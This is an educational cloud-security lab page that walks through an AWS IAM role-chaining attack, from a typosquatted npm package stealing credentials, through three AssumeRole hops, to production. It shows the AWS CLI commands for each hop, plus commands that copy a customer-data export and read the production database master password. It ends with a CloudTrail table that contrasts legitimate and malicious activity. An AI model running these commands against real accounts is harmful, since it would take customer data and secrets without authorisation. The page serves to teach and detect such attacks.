# Lab 9.4: IAM Chain Abuse

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

**Goal:** Starting from a compromised dev dependency, traverse the full chain to production.

## Initial compromise

A malicious npm package (typosquat) reads `~/.aws/credentials` and environment variables, exfiltrates them. The attacker now has `dev-deploy` credentials.

## Hop 1: Dev to CI

```bash
aws sts assume-role \
    --role-arn arn:aws:iam::222222222222:role/ci-runner \
    --role-session-name "developer-alice-ci-trigger" \
    --duration-seconds 43200
```

Succeeds: no ExternalId, no source IP restriction, no MFA, max 12-hour session.

## Hop 2: CI to Staging

```bash
aws sts assume-role \
    --role-arn arn:aws:iam::333333333333:role/staging-deploy \
    --role-session-name "ci-staging-deploy-manual"
```

No CodeBuild job ran. No tests passed. The attacker called AssumeRole directly.

## Hop 3: Staging to Production

```bash
aws sts assume-role \
    --role-arn arn:aws:iam::444444444444:role/prod-deploy \
    --role-session-name "staging-prod-promote"
```

## Exfiltrate production data

```bash
aws s3 cp s3://customer-data-444444444444/exports/customers-full-2026.csv /tmp/
aws secretsmanager get-secret-value --secret-id prod/database/master-password
```

**Total time: 8 minutes.** No individual trust policy was "wrong."

## CloudTrail comparison

| Property | Legitimate | Malicious |
|----------|-----------|-----------|
| Time of day | 09:15 UTC (business hours) | 02:14 UTC |
| Source IP | 203.0.113.50 (office) | 198.51.100.77 (unknown) |
| Session duration | 3600s (1 hour) | 43200s (12 hours) |
| Time between hops | 7 minutes (build ran) | 28 seconds (no build) |
| Subsequent actions | `codebuild:StartBuild` | `s3:GetObject` on customer data |

---

!!! success "Checkpoint"
    You should have traced the full 4-hop chain and understand why each hop succeeded. The key insight: the chain mirrors the legitimate deployment lifecycle, but the attacker walked it manually in 8 minutes instead of waiting for CI/CD.
